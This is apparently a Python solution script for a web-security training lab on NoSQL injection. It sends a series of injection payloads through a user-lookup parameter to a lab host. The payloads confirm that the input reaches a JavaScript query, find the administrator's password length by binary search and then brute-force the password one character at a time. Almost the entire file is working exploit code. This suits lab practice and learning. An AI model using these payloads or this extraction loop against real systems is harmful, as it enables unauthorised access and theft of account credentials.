# NoSQL injection 17 of 24
# Lab: Exploiting NoSQL injection to extract data

import asyncio
from pprint import pprint
from common.base import run_payloads
from urllib.parse import quote_plus as urlencode_str

from common.payload_generators import generate_alphanumeric

RAW_REQUEST = """
GET /user/lookup?user=@@@PAYLOAD@@@ HTTP/2
Host: 0aad00b804766c5280bbfd57003500cf.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0aad00b804766c5280bbfd57003500cf.web-security-academy.net/my-account?id=wiener
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: session=jLIPfikDLq7dHhFTL3PavbnycLtxCYz1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True, follow_redirects=True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] in [200]:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "wiener")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0, True)

    # It fails: the input is not sanitized!
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("'"))
    print('With error:', end='')
    await print_net_result(raw_req_3, True)

    # It succeeds: js is accepted here!
    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener'+'"))
    print('With js code:', end='')
    await print_net_result(raw_req_4, True)

    # It succeeds, without results
    raw_req_5a = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener' && '1'=='2"))
    print('With false condition:', end='')
    await print_net_result(raw_req_5a, True)

    # It succeeds, with results
    raw_req_5b = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("wiener' && '1'=='1"))
    print('With true condition:', end='')
    await print_net_result(raw_req_5b, True)

    async def test (i):
        raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str(f"administrator' && this.password.length < {i} || 'a'=='b"))
        print(f'Administrator pwd len <{i}:', end='')
        _, response = await print_net_result(raw_req_6, True)
        isok = 'administrator' in response
        return isok

    # Linear search for pwd len:
    #for i in range(2, 30):
    #    isok = await test(i)
    #    if isok: break

    # Binary search for pwd len:
    from math import floor
    minlen = 1
    maxlen = 30
    while minlen < maxlen - 1:
        v = floor((minlen + maxlen) / 2)
        # print(minlen, v, maxlen)
        isok = await test(v)
        if isok: maxlen = v
        else: minlen = v
    print(f'Password length: {minlen}')

    pwd = ''
    for i in range(minlen):
        for char in generate_alphanumeric():
            raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str(f"administrator' && this.password[{i}] == '{char}"))
            print(f'Administrator pwd char {char} at pos {i}:', end='')
            _, response = await print_net_result(raw_req_8, True)
            isok = 'administrator' in response
            if isok:
                pwd += char
                break
    print(f'Password: {pwd}')

if __name__ == "__main__":
    asyncio.run(main())